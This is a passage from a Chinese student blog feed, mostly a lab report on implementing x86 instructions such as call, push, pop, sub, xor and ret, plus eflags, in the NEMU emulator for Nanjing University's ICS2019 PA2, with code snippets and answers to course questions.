href="https://nju-projectn.github.io/ics-pa-gitbook/ics2019/1.5.html">PA</a>中所述，未经测试的代码永远是错的。尽管已经在编写代码中进行了大量单元测试，在此一一列举出成功的样例也没有意义。这一部分可以参见项目视频。而且我们只是体会文本编辑器的工作方式和原理，而非真的去造这么一个轮子出来，像PA中提到的<a href="https://nju-projectn.github.io/ics-pa-gitbook/ics2019/1.5.html">KISS法则</a>样，只是实现了最基础的功能，更高级的设计，安全甚至性能都不是在一开始的实现过程需要考虑的，追求面面俱到只会增加代码维护的难度。即便如此，由于时间仓促，前面的分析可以看到，设计上仍旧有失误，也难免会出现这样那样未全面测试到的问题。当然，这个项目除了完成作业以外纯粹是兴趣驱动，没有功利性的目的，更没有任何实际价值(我们为什么不用VSCode呢)，因此暂时就容许这些失误出现吧(毕竟还有很多更重要的事情要做)，后续对bug的修复和对代码的重构在自己功力更深厚，思路更清晰的时候做，会更容易一些。</p><h2 id="借物表">借物表</h2><p><a href="https://www.bilibili.com/video/BV16M4y167tB/?spm_id_from=333.999.0.0">续加仪</a>的代码编辑器给了我灵感和启动项目的动力。基本的高亮部分和行号绘制部分参考了这个项目。</p><p><a href="https://jetbrains.design/intellij/resources/icons_list/">JetBrainsIcons</a></p><p><a href="https://github.com/microsoft/vscode-icons">VSCodeIcons</a></p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>南京大学ics2019_PA2</title>
    <link href="/posts/44749/"/>
    <url>/posts/44749/</url>
    
    <content type="html"><![CDATA[<h1 id="pa2实验报告">PA2实验报告</h1><p>2013599 田佳业</p><h2 id="关于pa究竟整了个什么的问题">关于PA究竟整了个什么的问题</h2><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210933443509_251_20230523225355617758_115_image-20230417214640107.png" alt="image-20230417214640107"><figcaption aria-hidden="true">image-20230417214640107</figcaption></figure><h2 id="一阶段">一阶段</h2><h3 id="任务">任务</h3><p>熟悉添加指令的流程，完成<code>dummy</code>程序运行。并且真正学会RTFM。</p><h4 id="遇到的问题">遇到的问题</h4><p>1.运行<code>make ARCH=x86-nemu ALL=dummy run</code>出现如图所示错误:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gl2jtulmrh9u68"></i><span>shell</span><div class="collapse show" id="collapse-gl2jtulmrh9u68"><pre><code class="hljs shell">fatal error: bits/libc-header-start.h: No such file or directory</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210935594767_446_20230523225359236876_857_image-20230416202629539.png" alt="image-20230416202629539"><figcaption aria-hidden="true">image-20230416202629539</figcaption></figure><p>解决方法:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-x583fvlmrh9u68"></i><span>shell</span><div class="collapse show" id="collapse-x583fvlmrh9u68"><pre><code class="hljs shell">sudo apt-get install gcc-multilib</code></pre></div></div><p>因为我们是要模拟一个i386的isa，它是32位的。</p><p>之后又遇到下述错误:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qwy8rplmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-qwy8rplmrh9u68"><pre><code class="hljs C++">/home/lunaticsky/ics2019/nexus-am/am/src/nemu-common/trm.c: In function ‘_trm_init’:/home/lunaticsky/ics2019/nexus-am/am/src/nemu-common/trm.c:<span class="hljs-number">26</span>:<span class="hljs-number">15</span>: error: array subscript <span class="hljs-number">-1048576</span> is outside array bounds of ‘<span class="hljs-type">const</span> <span class="hljs-type">char</span>[<span class="hljs-number">1</span>]’ [-Werror=array-bounds]   <span class="hljs-number">26</span> |   <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mainargs = &amp;_start - <span class="hljs-number">0x100000</span>;      |               ^~~~~~~~/home/lunaticsky/ics2019/nexus-am/am/src/nemu-common/trm.c:<span class="hljs-number">25</span>:<span class="hljs-number">21</span>: note: <span class="hljs-keyword">while</span> referencing ‘_start’   <span class="hljs-number">25</span> |   <span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> _start;      |                     ^~~~~~</code></pre></div></div><p>这个错误并没有找到理想的解决方法。为了能够继续完成实验，只好把<code>Makefile.compile</code>的<code>Werror</code>编译选项去掉了。这不是一个优雅的解决方案。</p><p>2.按照问题汇总<code>trm_init 和 main 函数的开头出现 endbr32 指令</code>部分</p><p>在 AM_HOME/makefile.compile 文件中，在和 nemu 有关的 CFLAGS后面添加-fcf-protection=none和-mmanual-endbr的方法修改后makefile报错</p><p>加了换行没加反斜杠。。</p><h4 id="实现新指令">实现新指令</h4><p>可以看到第一个我们需要实现的指令是<code>call</code>指令。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210936480131_528_20230523225403430212_787_image-20230416203550556.png" alt="image-20230416203550556"><figcaption aria-hidden="true">image-20230416203550556</figcaption></figure><p>首先在<code>nemu/src/isa/x86/exec/all-instr.h</code>把需要实现的指令声明。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210937636344_421_20230523225407881850_360_image-20230416230556955.png" alt="image-20230416230556955"><figcaption aria-hidden="true">image-20230416230556955</figcaption></figure><h5 id="call_prepare">call_prepare</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210938436096_558_20230523225409905724_209_image-20230416215526140.png" alt="image-20230416215526140"><figcaption aria-hidden="true">image-20230416215526140</figcaption></figure><p>这里顺带把后面几个可能用到的也填了:</p><p>可以这些<code>opcode</code>都是单字节的，填<code>opcode_table</code>的时候千万不要错填到2字节部分！</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zd5xk3lmrh9u68"></i><span>c</span><div class="collapse show" id="collapse-zd5xk3lmrh9u68"><pre><code class="hljs c"><span class="hljs-comment">/* 0xe8 */</span>IDEX(I,call), IDEX(J,jmp), EMPTY, IDEXW(J,jmp,<span class="hljs-number">1</span>),</code></pre></div></div><p>显然call 指令的实现中需要使用压栈操作，因此先去实现push指令。</p><h5 id="push_prepare">push_prepare</h5><p>这个指令学长贴心的给出了勘误:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210939643621_797_20230523225414254273_952_image-20230416213829809.png" alt="image-20230416213829809"><figcaption aria-hidden="true">image-20230416213829809</figcaption></figure><p>填<code>opcode_table</code></p><p><code>nemu/src/isa/x86/exec/exec.c</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-65cemslmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-65cemslmrh9u68"><pre><code class="hljs C++"><span class="hljs-comment">/* 0x50 */</span><span class="hljs-built_in">IDEX</span>(r, push), <span class="hljs-built_in">IDEX</span>(r, push), <span class="hljs-built_in">IDEX</span>(r, push), <span class="hljs-built_in">IDEX</span>(r, push),<span class="hljs-comment">/* 0x54 */</span><span class="hljs-built_in">IDEX</span>(r, push), <span class="hljs-built_in">IDEX</span>(r, push), <span class="hljs-built_in">IDEX</span>(r, push), <span class="hljs-built_in">IDEX</span>(r, push),</code></pre></div></div><p>ics2019把ISA相关的RTL伪指令放到了<code>nemu/src/isa/$ISA/include/isa/rtl.h</code>中定义，一开始去<code>nemu/include</code>没找到，后来发现指导手册里有说明，还是没仔细看。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-s0sseqlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-s0sseqlmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">rtl_push</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">rtlreg_t</span>* src1)</span> </span>{  <span class="hljs-comment">// esp &lt;- esp - 4</span>  <span class="hljs-comment">// M[esp] &lt;- src1</span>  <span class="hljs-comment">//TODO();</span>  <span class="hljs-built_in">rtl_subi</span>(&amp;cpu.esp, &amp;cpu.esp, <span class="hljs-number">4</span>);  <span class="hljs-built_in">rtl_sm</span>(&amp;cpu.esp, src1, <span class="hljs-number">4</span>);}</code></pre></div></div><p>而且一个坑是它的api和2018的是不一样的:</p><p>错误代码:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210940913969_388_20230523225417105196_820_image-20230416233834598.png" alt="image-20230416233834598"><figcaption aria-hidden="true">image-20230416233834598</figcaption></figure><p>于是开始寻找这个函数的原型。</p><p>这是2018版</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210941888400_540_20230523225419412587_384_image-20230416233012943.png" alt="image-20230416233012943"><figcaption aria-hidden="true">image-20230416233012943</figcaption></figure><p>2019版在Vsocde找了半天没找到，看到唯一一个框架代码给出的示例，发现含义确实和预想的不一样，最后一个参数才是长度。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210943221334_840_20230523225422546936_285_image-20230416233317635.png" alt="image-20230416233317635"><figcaption aria-hidden="true">image-20230416233317635</figcaption></figure><p>当然这个函数原型也是能找到的，只是因为<code>rtl-wrapper.h</code>做了包装，Vscode没法直接跳转而已。这个因为是体系结构抽象层的接口，在<code>nemu/include/rtl/rtl.h</code>里面。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210944258582_792_20230523225426665320_827_image-20230416233126823.png" alt="image-20230416233126823"><figcaption aria-hidden="true">image-20230416233126823</figcaption></figure><h5 id="sub">sub</h5><p>然后这时候发现，我们想实现push，sub都没实现哩。开始折磨起来了。</p><p>sub本身的实现不难。因为实验代码中给了更复杂的<code>sbb</code>指令的实现，仿照即可。代码如下:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hzkuaslmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-hzkuaslmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(sub) {  <span class="hljs-comment">//TODO();</span><span class="hljs-built_in">rtl_sub</span>(&amp;s0,&amp;id_dest-&gt;val,&amp;id_src-&gt;val);<span class="hljs-built_in">rtl_update_ZFSF</span>(&amp;s0,id_dest-&gt;width);<span class="hljs-built_in">rtl_is_sub_carry</span>(&amp;s1,&amp;s0,&amp;id_dest-&gt;val);<span class="hljs-built_in">rtl_set_CF</span>(&amp;s1);<span class="hljs-built_in">rtl_is_sub_overflow</span>(&amp;s1,&amp;s0,&amp;id_dest-&gt;val,&amp;id_src-&gt;val,id_dest-&gt;width);        <span class="hljs-comment">//printf("%d %d\n",id_dest-&gt;val,id_src-&gt;val);assert(0);</span><span class="hljs-built_in">rtl_set_OF</span>(&amp;s1);<span class="hljs-built_in">operand_write</span>(id_dest,&amp;s0);<span class="hljs-built_in">print_asm_template2</span>(sub);}</code></pre></div></div><p>还要注意一点，在文档的附录里面说了，x86使用<code>ModR/M</code>字节中的扩展opcode域来对<code>opcode</code>的长度进行扩充.有些时候, 读入一个字节也还不能完全确定具体的指令形式,这时候需要读入紧跟在<code>opcode</code>后面的<code>ModR/M</code>字节,把其中的<code>reg/opcode</code>域当做<code>opcode</code>的一部分来解释,才能决定具体的指令形式. x86把这些指令划分成不同的指令组(instructiongroup)。</p><p>框架代码的<code>make_group</code>就是干这事的，不加跑不起来，因为译码的时候要用。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210945133885_542_20230523225429817644_186_image-20230417211556676.png" alt="image-20230417211556676"><figcaption aria-hidden="true">image-20230417211556676</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-df894plmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-df894plmrh9u68"><pre><code class="hljs C++"><span class="hljs-comment">/* 0x80, 0x81, 0x83 */</span><span class="hljs-built_in">make_group</span>(gp1,    <span class="hljs-built_in">EX</span>(add), <span class="hljs-built_in">EX</span>(<span class="hljs-keyword">or</span>), <span class="hljs-built_in">EX</span>(adc), <span class="hljs-built_in">EX</span>(sbb),    <span class="hljs-built_in">EX</span>(<span class="hljs-keyword">and</span>), <span class="hljs-built_in">EX</span>(sub), <span class="hljs-built_in">EX</span>(<span class="hljs-keyword">xor</span>), <span class="hljs-built_in">EX</span>(cmp))</code></pre></div></div><p>这几个位置涉及到<a href="https://www.jianshu.com/p/b7c968baecaf">变长指令</a>，比如</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ksm6evlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-ksm6evlmrh9u68"><pre><code class="hljs C++"><span class="hljs-number">100017</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">14</span>             sub    $<span class="hljs-number">0x14</span>,%esp</code></pre></div></div><p>就是这一类的。</p><p>实现<code>sub</code>的主要问题是还需要实现<code>eflags</code>。</p><h5 id="eflags">eflags</h5><p>eflags各位的含义</p><blockquote><p>CF(bit 0) [Carry flag]若算术操作产生的结果在最高有效位(most-significant bit)发生进位或借位则将其置 1，反之清零。这个标志指示无符号整型运算的溢出状态，这个标志同样在多倍精度运算(multiple-precision arithmetic)中使用。</p><p>ZF(bit 6) [Zero flag] 若结果为 0 则将其置 1，反之清零。</p><p>SF(bit 7) [Sign flag] 该标志被设置为有符号整型的最高有效位。(0指示结果为正，反之则为负)</p><p>IF(bit 9) [Interrupt enable flag]该标志用于控制处理器对可屏蔽中断请求(maskable interrupt requests)的响应。置 1 以响应可屏蔽中断，反之则禁止可屏蔽中断。</p><p>OF(bit 11) [Overflow flag]如果整型结果是较大的正数或较小的负数，并且无法匹配目的操作数时将该 位置1，反之清零。这个标志为带符号整型运算指示溢出状态。</p></blockquote><p>我们可以用<a href="https://zh.wikipedia.org/zh-hans/%E4%BD%8D%E6%AE%B5">位域</a>实现<code>eflag</code>结构，它本质上就是一个结构体。把它放到<code>CPU_state</code>结构体里面。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-e944rmlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-e944rmlmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">union</span>{    <span class="hljs-keyword">struct</span>{        <span class="hljs-type">uint32_t</span> CF:<span class="hljs-number">1</span>;        <span class="hljs-type">unsigned</span> :<span class="hljs-number">5</span>;        <span class="hljs-type">uint32_t</span> ZF:<span class="hljs-number">1</span>;        <span class="hljs-type">uint32_t</span> SF:<span class="hljs-number">1</span>;        <span class="hljs-type">unsigned</span> :<span class="hljs-number">1</span>;        <span class="hljs-type">uint32_t</span> IF:<span class="hljs-number">1</span>;        <span class="hljs-type">unsigned</span> :<span class="hljs-number">1</span>;        <span class="hljs-type">uint32_t</span> OF:<span class="hljs-number">1</span>;        <span class="hljs-type">signed</span> :<span class="hljs-number">20</span>;    };    <span class="hljs-type">uint32_t</span> val;}eflags;</code></pre></div></div><p>不要忘了eflags 的初始化。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-l60vcilmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-l60vcilmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">restart</span><span class="hljs-params">()</span> </span>{  <span class="hljs-comment">/* Set the initial program counter. */</span>  cpu.pc = PC_START;  cpu.eflags.val = <span class="hljs-number">0x2</span>;  }</code></pre></div></div><p>这时候再运行，发现eflag更新相关的rtl方法还没实现。</p><p>下面是更新ZF标志的方法，根据不同长度判断相与是否为0.或许可以有更好的方法或者可以调用接口实现，不过如文档所说，先完成再完美。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-if6yp3lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-if6yp3lmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">switch</span> (width){<span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:{  t0 = (*result == <span class="hljs-number">0</span>);  <span class="hljs-built_in">rtl_set_ZF</span>(&amp;t0);  <span class="hljs-keyword">break</span>;}<span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:{  t0 = ((*result &amp; <span class="hljs-number">0xffff</span>) == <span class="hljs-number">0</span>);  <span class="hljs-built_in">rtl_set_ZF</span>(&amp;t0);  <span class="hljs-keyword">break</span>;}<span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:{  t0 = ((*result &amp; <span class="hljs-number">0xff</span>) == <span class="hljs-number">0</span>);  <span class="hljs-built_in">rtl_set_ZF</span>(&amp;t0);  <span class="hljs-keyword">break</span>;}<span class="hljs-keyword">default</span>:  <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);}</code></pre></div></div><p>框架还要求我们去实现一个设置标志位的宏。就连这么小的一个功能都要抽象成一个宏，而不是复制黏贴设置<code>src</code>和<code>dest</code>，相较文档中的哲学确实做到了言行一致。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9teeu6lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-9teeu6lmrh9u68"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> make_rtl_setget_eflags(f) \</span><span class="hljs-meta">  static inline void concat(rtl_set_, f) (const rtlreg_t* src) { \</span><span class="hljs-meta">    cpu.eflags.f=*src; \</span><span class="hljs-meta">  } \</span><span class="hljs-meta">  static inline void concat(rtl_get_, f) (rtlreg_t* dest) { \</span><span class="hljs-meta">    *dest=cpu.eflags.f; \</span><span class="hljs-meta">  }</span></code></pre></div></div><p>中间还涉及要要求判断何时“溢出”和“借位”以及判断有效最高位。虽然计算机使用补码运算，没有“借位”这一概念，但减法变成补码加法运算的时候没进位，其实就是借位了。这一部分的实现是真·小学知识，但确实很琐碎，具体代码不在报告展示了。</p><h5 id="push">push</h5><p><code>nemu/src/isa/x86/exec/data-mov.c</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pvzwfclmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-pvzwfclmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(push) {  <span class="hljs-comment">//TODO();</span>  <span class="hljs-built_in">rtl_push</span>(&amp;id_dest -&gt; val);  <span class="hljs-built_in">print_asm_template1</span>(push); }</code></pre></div></div><h5 id="call">call</h5><p>下面就可以把<code>call</code>的<code>make_EHelper</code>补充完整了。ics2019为了照顾不同的ISA，相比2018改了一些变量名。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-78rpqhlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-78rpqhlmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(call) {  <span class="hljs-comment">// the target address is calculated at the decode stage</span> <span class="hljs-comment">// TODO();</span><span class="hljs-built_in">rtl_push</span>(pc); <span class="hljs-comment">//push pc</span>  <span class="hljs-built_in">rtl_j</span>(decinfo.jmp_pc); <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"call %x"</span>, decinfo.jmp_pc);}</code></pre></div></div><p>call指令是先将当前的pc压入栈中，再转移eip。转移eip这一步需要J指令。</p><p>J指令看上去已经实现好了，但是运行还是不正确。仔细想了一下指令的执行步骤，找了代码，发现连J的译码用到了<code>make_DopHelper(SI)</code>。连这个都得要求自己实现。</p><p>可以看到现在<code>call</code>指令已经能够运行了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210946163716_943_20230523225433985560_176_image-20230417193049419.png" alt="image-20230417193049419"><figcaption aria-hidden="true">image-20230417193049419</figcaption></figure><p>可以看到<code>push</code>的实现并不完善，它没有识别到后面的立即数。通过操作码定位到发现是<code>make_DopHelper(SI)</code>函数实现出现了问题，改正即可。</p><p>整体来看，实现<code>call</code>的过程像是栈工作的过程:随着问题的发现任务栈逐渐加深，步步为营解决了细节问题之后，带领我们来到细节问题的，初看上去很吓人的问题也随之解决了(pop）。不管是做高中压轴题，做PA，还是学习新知识，做项目，经历了上山的过程才有下山的愉悦。</p><p>回到PA。这一阶段还没完呢矮油喂。。</p><h5 id="pop">pop</h5><p>pop的实现和push类似，虽然在一阶段用不到，反正迟早要做，就一起写了。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wgr1hclmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-wgr1hclmrh9u68"><pre><code class="hljs C++"><span class="hljs-comment">/* 0x58 */</span><span class="hljs-built_in">IDEX</span>(r, pop), <span class="hljs-built_in">IDEX</span>(r, pop), <span class="hljs-built_in">IDEX</span>(r, pop), <span class="hljs-built_in">IDEX</span>(r, pop),<span class="hljs-comment">/* 0x5c */</span>EMPTY, <span class="hljs-built_in">IDEX</span>(r, pop), <span class="hljs-built_in">IDEX</span>(r, pop), <span class="hljs-built_in">IDEX</span>(r, pop),</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5h1n7ulmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-5h1n7ulmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">rtl_pop</span><span class="hljs-params">(<span class="hljs-type">rtlreg_t</span>* dest)</span> </span>{  <span class="hljs-comment">// dest &lt;- M[esp]</span>  <span class="hljs-comment">// esp &lt;- esp + 4</span>  <span class="hljs-comment">// TODO();</span>  <span class="hljs-built_in">rtl_lm</span>(dest, &amp;cpu.esp, <span class="hljs-number">4</span>);  <span class="hljs-built_in">rtl_addi</span>(&amp;cpu.esp, &amp;cpu.esp, <span class="hljs-number">4</span>);}</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2w0g05lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-2w0g05lmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(pop){  <span class="hljs-comment">// TODO();</span>  <span class="hljs-built_in">rtl_pop</span>(&amp;t0);                     <span class="hljs-comment">// register t0 is used according to the convention</span>  <span class="hljs-keyword">if</span> (id_dest-&gt;type == OP_TYPE_REG) <span class="hljs-comment">// dest is register, write to register</span>  {    <span class="hljs-built_in">rtl_sr</span>(id_dest-&gt;reg, id_dest-&gt;width, &amp;t0);  }  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (id_dest-&gt;type == OP_TYPE_MEM) <span class="hljs-comment">// dest is memory, write to memory</span>  {    <span class="hljs-built_in">rtl_sm</span>(&amp;id_dest-&gt;addr, id_dest-&gt;width, &amp;t0);  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-comment">//should not reach here</span>    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }  <span class="hljs-built_in">print_asm_template1</span>(pop);}</code></pre></div></div><h5 id="xor">xor</h5><p>现在来到了<code>xor</code>。经历了实现<code>call</code>指令的折磨，对实现<code>xor</code>也更有信心了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210947894128_296_20230523225437555540_310_image-20230417195212809.png" alt="image-20230417195212809"><figcaption aria-hidden="true">image-20230417195212809</figcaption></figure><p><code>xor</code>的执行函数在<code>logic.c</code>里面。</p><p>仿照着写，并不难。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-72nuuilmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-72nuuilmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(<span class="hljs-keyword">xor</span>){<span class="hljs-built_in">rtl_li</span>(&amp;s1,<span class="hljs-number">0</span>);<span class="hljs-built_in">rtl_set_OF</span>(&amp;s1);<span class="hljs-built_in">rtl_set_CF</span>(&amp;s1);<span class="hljs-built_in">rtl_xor</span>(&amp;s0,&amp;id_dest-&gt;val,&amp;id_src-&gt;val);<span class="hljs-built_in">rtl_update_ZFSF</span>(&amp;s0,id_dest-&gt;width);<span class="hljs-built_in">operand_write</span>(id_dest,&amp;s0);<span class="hljs-built_in">print_asm_template2</span>(<span class="hljs-keyword">xor</span>);}</code></pre></div></div><p>对照手册，我们需要关心的<code>opcode</code>是<code>0x30-0x35</code>。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210949076005_747_20230523225440170402_511_image-20230417212128063.png" alt="image-20230417212128063"><figcaption aria-hidden="true">image-20230417212128063</figcaption></figure><h5 id="ret">ret</h5><p><code>dummy</code>跑通的临门一脚。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210950019919_424_20230523225442415385_539_image-20230417212351555.png" alt="image-20230417212351555"><figcaption aria-hidden="true">image-20230417212351555</figcaption></figure><p>先去附录找到c3对应的内容，定位到<code>ret</code>的页面:</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210950956612_740_20230523225446946199_759_image-20230417212512264.png" alt="image-20230417212512264" width="50%" height="50%"></p><p>可以看到<code>ret</code>有好几种形式。但是我们显然只需要实现<code>c3</code>就可以满足需要。</p><p>根据描述，C3 ret是用栈的数据修改IP的内容，实现近转移。</p><p>我们在操作系统课上学过，<code>ret</code>弹出栈中保存的<code>eip</code>，跳到对应地址就可以返回调用它的位置。注意设置跳转标志。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-aicw53lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-aicw53lmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(ret){<span class="hljs-built_in">rtl_pop</span>(&amp;decinfo.jmp_pc);<span class="hljs-built_in">rtl_j</span>(decinfo.jmp_pc);<span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"ret"</span>);}</code></pre></div></div><p><strong><font color="green">HIT GOOD TRAP!</font></strong></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210952140025_873_20230523225449300327_530_image-20230417213124076.png" alt="image-20230417213124076"><figcaption aria-hidden="true">image-20230417213124076</figcaption></figure><h3 id="问题">问题</h3><h6 id="立即数背后的故事">立即数背后的故事</h6><p>放到大端机上运行的时候内存布局，NEMU读取方式是一样的，但CPU的解释方式不一样了，因此会出问题。</p><p>怎么解决，既然NEMU是一个模拟器，就看QEMU是怎么解决的。模拟器确实需要<a href="https://github.com/coreos/qemu/blob/master/include/qemu/bswap.h">解决</a>这个问题</p><p>mips32和riscv32的指令长度只有32位, 因此它们不能像x86那样,把C代码中的32位常数直接编码到一条指令中.mips32和riscv32应该如何解决这个问题?</p><p>我们在机组课上学过MIPS指令。MIPS是通过<code>lui</code>和<code>ori</code>用两条指令分别加载高16位和低16位立即数。</p><p>riscv虽然不甚了解，但查阅资料<a href="https://blog.csdn.net/zoomdy/article/details/83067689">可知</a>也是通过类似的思虑进行的。</p><h6 id="拦截客户程序访存越界的非法行为">拦截客户程序访存越界的非法行为</h6><p>你将来很可能会遇到客户程序访存越界的错误,NEMU的框架代码一旦检测到这一行为就会直接panic.这一行为的检测已经极大地帮助你发现代码的问题了, 想象一下,如果NEMU并未拦截这一error, 你可能会看到怎么样的failure?</p><p>事实上访问到无法控制的内存，得到错误的结果甚至core dump。</p><h6 id="神秘的host内存访问-建议二周目思考">神秘的host内存访问(建议二周目思考)</h6><p>为什么需要有host内存访问的RTL指令呢?</p><p>阅读源码发现，用到host内存访问指令的是</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-oc11a7lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-oc11a7lmrh9u68"><pre><code class="hljs 